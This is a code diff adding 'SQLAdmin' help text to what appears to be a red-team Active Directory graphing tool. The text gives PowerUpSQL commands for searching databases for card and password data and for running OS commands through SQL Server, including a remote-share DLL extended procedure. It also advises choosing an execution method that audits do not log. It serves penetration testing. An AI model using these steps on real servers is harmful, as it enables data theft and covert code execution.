@@ -225,6 +225,13 @@ export default class HelpModal extends Component {
                 targetType,
                 targetName
             );
+        } else if (edge.label === 'SQLAdmin'){
+            formatted = `The user ${sourceName} is a SQL admin on the computer ${targetName}.
+
+            There is at least one MSSQL instance running on ${targetName} where the user ${sourceName} is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques.
+
+            For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of "MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.`;
+
         }
 
         this.setState({ infoTabContent: { __html: formatted } });
@@ -1560,6 +1567,59 @@ export default class HelpModal extends Component {
             Use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
             
             <code>Rubeus.exe s4u /user:${sourceName}$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
+        } else if (edge.label === 'SQLAdmin'){
+                formatted = `Scott Sutherland (<a href="https://twitter.com/_nullbind">@nullbind</a>) from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL Server. Major contributors include Antti Rantasaari, Eric Gruber (<a href="https://twitter.com/egru">@egru</a>), and Thomas Elling (<a href="https://github.com/thomaselling">@thomaselling</a>). Before executing any of the below commands, download PowerUpSQL and laod it into your PowerShell instance. Get PowerUpSQL here: <a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a>.
+
+                <h4>Finding Data</h4>
+                Get a list of databases, sizes, and encryption status:
+                
+                <code>Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\instance –Threads 10 -NoDefaults</code>
+                
+                Search columns and data for keywords:
+                
+                <code>Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\instance –Threads 10 –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize</code>
+                
+                <h4>Executing Commands</h4>
+                Below are examples of PowerUpSQL functions that can be used to execute operating system commands on remote systems through SQL Server using different techniques.  The level of access on the operating system will depend largely what privileges are provided to the service account.  However, when domain accounts are configured to run SQL Server services, it is very common to see them configured with local administrator privileges.
+                
+                xp_cmdshell Execute Example:
+                
+                <code>Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance sqlserver\instance</code>
+                
+                Agent Job Execution Examples:
+                
+                <code>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\windows\temp\test1.txt" -Instance sqlserver\instance -username myuser -password mypassword</code>
+                
+                <code>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\windows\temp\test2.txt' -Sleep 20 -Instance sqlserver\instance -username myuser -password mypassword</code>
+                
+                <code>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt' -Instance sqlserver\instance -username myuser -password mypassword</code>
+                
+                <code>Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt' -Instance sqlserver\instance -username myuser -password mypassword</code>
+                
+                Python Subsystem Execution:
+                <code>Invoke-SQLOSPython -Verbose -Command "Whoami" -Instance sqlserver\instance</code>
+                R subsystem Execution Example
+                
+                <code>Invoke-SQLOSR -Verbose -Command "Whoami" -Instance sqlserver\instance</code>
+                OLE Execution Example
+                
+                <code>Invoke-SQLOSOle -Verbose -Command "Whoami" -Instance sqlserver\instance</code>
+                CLR Execution Example
+                
+                <code>Invoke-SQLOSCLR -Verbose -Command "Whoami" -Instance sqlserver\instance</code>
+                
+                Custom Extended Procedure Execution Example:
+                1. Create a custom extended stored procedure.
+                <code>Create-SQLFileXpDll -Verbose -OutFile c:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test</code>
+                
+                2. Host the test.dll on a share readable by the SQL Server service account. 
+                <code>Get-SQLQuery -Verbose -Query "sp_addextendedproc 'xp_test', '\\yourserver\yourshare\myxp.dll'" -Instance sqlserver\instance</code>
+                
+                3. Run extended stored procedure
+                <code>Get-SQLQuery -Verbose -Query "xp_test" -Instance sqlserver\instance</code>
+                
+                4. Remove extended stored procedure.
+                <code>Get-SQLQuery -Verbose -Query "sp_dropextendedproc 'xp_test'" -Instance sqlserver\instance</code>`;
         }
 
         this.setState({ abuseTabContent: { __html: formatted } });
@@ -1656,6 +1716,55 @@ export default class HelpModal extends Component {
             formatted = `To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. Modification of the *msDS-AllowedToActOnBehalfOfOtherIdentity* property against the target also must occur, whether through PowerShell or another method. The property should be cleared (or reset to its original value) after attack execution in order to prevent easy detection.`;
         } else if (edge.label === 'AllowedToAct') {
             formatted = `To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain.`;
+        } else if (edge.label === 'SQLAdmin'){
+            formatted = `Prior to executing operating system commands through SQL Server, review the audit configuration and choose a command execution method that is not being monitored.
+            
+            View audits:
+            <code>SELECT * FROM sys.dm_server_audit_status</code>
+            
+            View server specifications:
+            <code>
+            SELECT audit_id, 
+            a.name as audit_name, 
+            s.name as server_specification_name, 
+            d.audit_action_name, 
+            s.is_state_enabled, 
+            d.is_group, 
+            d.audit_action_id, 
+            s.create_date, 
+            s.modify_date 
+            FROM sys.server_audits AS a 
+            JOIN sys.server_audit_specifications AS s 
+            ON a.audit_guid = s.audit_guid 
+            JOIN sys.server_audit_specification_details AS d 
+            ON s.server_specification_id = d.server_specification_id
+            </code>
+            
+            View database specifications:
+            <code>
+            SELECT a.audit_id, 
+            a.name as audit_name, 
+            s.name as database_specification_name, 
+            d.audit_action_name, 
+            d.major_id,
+            OBJECT_NAME(d.major_id) as object,
+            s.is_state_enabled, 
+            d.is_group, s.create_date, 
+            s.modify_date, 
+            d.audited_result 
+            FROM sys.server_audits AS a 
+            JOIN sys.database_audit_specifications AS s 
+            ON a.audit_guid = s.audit_guid 
+            JOIN sys.database_audit_specification_details AS d 
+            ON s.database_specification_id = d.database_specification_id
+            </code>
+            
+            If server audit specifications are configured on the SQL Server, event ID 15457 logs may be created in the Windows Application log when SQL Server level configurations are changed to facilitate OS command execution.
+            
+            If database audit specifications are configured on the SQL Server, event ID 33205 logs may be created in the Windows Application log when Agent and database level configuration changes are made.
+            
+            A summary of the what will show up in the logs, along with the TSQL queries for viewing and configuring audit configurations can be found at 
+            <a>https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql</a>.`;
         }
 
         this.setState({ opsecTabContent: { __html: formatted } });
@@ -1837,6 +1946,12 @@ export default class HelpModal extends Component {
             <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
             <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
             <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
+        } else if (edge.label === 'SQLAdmin'){
+            formatted = `<a href="https://github.com/NetSPI/PowerUpSQL/wiki">https://github.com/NetSPI/PowerUpSQL/wiki</a>
+            <a href="https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation">https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation</a>
+            <a href="https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver">https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver</a>
+            <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017">https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017</a>
+            <a href="https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/">https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/</a>`;
         }
 
         this.setState({ referencesTabContent: { __html: formatted } });
